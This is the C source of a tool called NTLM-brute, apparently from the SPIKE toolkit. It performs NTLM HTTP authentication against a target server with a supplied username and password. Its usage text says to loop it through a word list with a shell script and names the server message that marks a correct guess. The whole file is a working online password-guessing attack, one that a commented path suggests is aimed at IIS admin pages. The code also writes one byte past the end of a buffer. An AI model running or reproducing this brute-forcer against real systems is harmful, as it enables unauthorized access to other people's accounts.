/*
  this is NTLM-brute - a generic password guesser.
  It's just a shell for now. Eventually I'll get it working.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h> /*for memset*/
#include <sys/types.h>
#include <sys/socket.h>
#include <ntlm.h>

#include "spike.h"
#include "base64.h"
#include "hdebug.h"
#include "tcpstuff.h"

/*global variables */
char *url,*host;

void
usage()
{
  fprintf(stderr,"Usage: ./ntlm_brute target port username[@domain] password url\r\n");
  fprintf(stderr,"If you get a nice message from the server saying Use Localhost only, then you got the right password. Use a shell script to spam this througha word list or something. \n");
  exit(-1);
}


int
send_ntlm_packet(unsigned char * packet)
{

  /*takes a url, host, and posts it*/
  s_string("PUT ");
  s_string(url);

  s_string(" HTTP/1.1\r\n");
  s_string("Host: ");
  s_string(host);
  s_string("\r\n");
  s_string("Authorization: NTLM ");
  s_string(packet);
  s_string("\r\n");
  
  s_string("Connection: Keep-Alive\r\n");
  s_string("User-Agent: Mozilla/4.76 [en] (X11; U; Linux 2.4.2-2 i686)\r\n");
  s_string("Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\n");
  s_string("Accept-Encoding: gzip\r\n");
  s_string("Accept-Language: en\r\n");
  s_string("Accept-Charset: iso-8859-1,*,utf-8\r\n");
  s_string("Content-Length: ");
  s_blocksize_string("post",7);
  s_string("\r\n\r\n");
  s_block_start("post");
  s_string("AAAA");
  s_block_end("post");
  if (spike_send()==0) /*failure*/
    {
      printf("Couldn't connect to host or send data!\r\n");
      exit(-1);
    }

  return 1;
}

int
main (int argc, char ** argv)
{
  char * target;
  char buffer[1500000];

  int port;

  unsigned char  *user, *domain;
  unsigned char * buf, *buf2;
  unsigned char * password;
  unsigned char * response;
  tSmbNtlmAuthRequest request;
  struct spike * our_spike;
  unsigned long retval;
  int notfin;

  if (argc!=6)
    {
      usage();
    }

  target=argv[1];
  printf("Target is %s\r\n",argv[1]);

  port=atoi(argv[2]);

  our_spike=new_spike();


  if (our_spike==NULL)
    {
      fprintf(stderr,"Malloc failed trying to allocate a spike.\r\n");
      exit(-1);
    }

  setspike(our_spike);
  host=strdup("127.0.0.1");
  /*url=strdup("/iisadmin/iis.asp");*/
  url=strdup(argv[5]);
  memset(buffer,0x41,sizeof(buffer));
  buffer[sizeof(buffer)]=0;
 
  buffer[140000]=0;


  user=strdup(argv[3]);
  domain=NULL; /*set domain with user@domain*/
  password=strdup(argv[4]);
  buf=malloc(500000); /*clumsy me*/
  buf2=malloc(500000);
  spike_connect_tcp(target,port);
  printf("Connected.\n");



  /*first we request to authorize via NTLM*/
  buildSmbNtlmAuthRequest((tSmbNtlmAuthRequest*)&request,user,domain);  
  /*go to base64 - need to integrate this into SPIKE proper*/
  to64frombits(buf, (unsigned char *)&request, SmbLength(&request));
  /*throw that in to NTLM Auth:*/

  send_ntlm_packet(buf);
  spike_clear();

  printf("reading server responsee\n");
  memset(buffer,0x00,sizeof(buffer));
  retval=1;
  while (retval!=0)
    {
      s_fd_wait();
      retval=read(our_spike->fd,buffer,1500);
      /*printf("%s",buffer);*/
      /*here we look for the string "WWW-Authenticate: NTLM " followed
        by a base64 encoded value which is deliminated by a \r\n"*/
      if ((response=s_scan_for_variable(buffer,"WWW-Authenticate: NTLM ","\r\n"))!=NULL)
	{
	  /*found our string*/
	  break;
	}
    }
  
  if (response==NULL)
    {
      printf("Couldn't find WWW-Authenticate string!\n");
      exit(1);

    }
  
  /*Grab the NTLM AUTH: response*/
  from64tobits(buf,response);
  buildSmbNtlmAuthResponse((tSmbNtlmAuthChallenge*)buf,
			   (tSmbNtlmAuthResponse*)buf2,
			   user,password);
  to64frombits(buf, buf2, SmbLength((tSmbNtlmAuthResponse*)buf2));
  /*send that out*/
  send_ntlm_packet(buf);
  spike_clear();

  /*now we should have gotten a valid response from the server*/
  /*hopefully this will have 200 Ok*/
  notfin=1;
  retval=1;
  while(retval && notfin) 
  {
    memset(buffer,0x00,sizeof(buffer));
    notfin=s_fd_wait();
    if (!notfin)
      break;
    retval=read(our_spike->fd,buffer,2500);
    if (retval)
      {
	printf("%s",buffer);
      }
  }/*end while read loop*/


  
  return 0;
}







